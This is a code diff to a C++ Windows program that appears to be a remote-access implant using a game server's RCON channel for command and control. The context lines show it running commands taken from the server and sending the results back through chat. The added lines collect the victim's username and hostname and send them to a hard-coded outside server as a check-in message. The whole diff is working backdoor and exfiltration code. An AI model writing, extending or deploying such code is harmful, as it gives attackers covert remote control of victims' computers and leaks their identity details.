@@ -107,7 +107,21 @@ main()
     // Request challenge for RCON authentication
     std::string challenge = getRconChallenge(serverAddress);
     std::cout << "[*] Received RCON challenge: " << challenge << std::endl;
+
+    // Check in to server
+    SOCKET s = socket(AF_INET, SOCK_DGRAM, 0);
+    char hostname[256] = { 0 };
+    gethostname(hostname, 256);
+    char username[256];
+    DWORD username_len = 256;
+    GetUserNameA(username, &username_len);
+    std::string checkin = "rcon " + challenge + " " + RCON_PASS + " say \"[*] New terrorist checked in: " + std::string(username) + "@" + std::string(hostname) + "\"";
+    std::cout << "[*] Sending RCON command - " << checkin << std::endl;
+    char rconCheckinCommand[1024];
+    sprintf_s(rconCheckinCommand, sizeof(rconCheckinCommand), "\xFF\xFF\xFF\xFF%s", checkin.c_str());
+    sendto(s, rconCheckinCommand, (int)strlen(rconCheckinCommand), 0, (struct sockaddr*)&serverAddress, sizeof(struct sockaddr_in));
     std::cout << "[*] Checked in to server @ " << SERVER_IP << ":" << SERVER_PORT << std::endl;
+    closesocket(s);
 
     // Get current server hostname
     std::string lastCommand = getHostnameFromCVARS(serverAddress, challenge);
@@ -126,13 +140,7 @@ main()
             std::string result = exec(currentCommand);
 
             // Send answer to chat, line by line
-            SOCKET s = socket(AF_INET, SOCK_DGRAM, 0);
-            if (s == INVALID_SOCKET)
-            {
-                std::cout << "[!] Socket creation failed" << std::endl;
-                WSACleanup();
-                return 1;
-            }
+            s = socket(AF_INET, SOCK_DGRAM, 0);
             
             std::istringstream iss(result);
             std::string line;
